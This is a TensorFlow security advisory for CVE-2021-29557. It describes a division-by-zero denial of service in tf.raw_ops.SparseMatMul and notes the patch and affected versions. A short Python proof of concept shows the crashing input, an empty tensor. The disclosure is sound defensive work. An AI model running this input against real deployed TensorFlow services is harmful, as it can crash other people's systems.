## TFSA-2021-044: Division by 0 in `SparseMatMul`

### CVE Number
CVE-2021-29557

### Impact
An attacker can cause a denial of service via a FPE runtime error in
`tf.raw_ops.SparseMatMul`:

```python
import tensorflow as tf

a = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)
b = tf.constant([], shape=[0, 2], dtype=tf.float32)

tf.raw_ops.SparseMatMul(
    a=a, b=b, transpose_a=True, transpose_b=True,
    a_is_sparse=True, b_is_sparse=True)
```

The division by 0 occurs deep in Eigen code because the `b` tensor is empty.

### Patches
We have patched the issue in GitHub commit
[7f283ff806b2031f407db64c4d3edcda8fb9f9f5](https://github.com/tensorflow/tensorflow/commit/7f283ff806b2031f407db64c4d3edcda8fb9f9f5).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
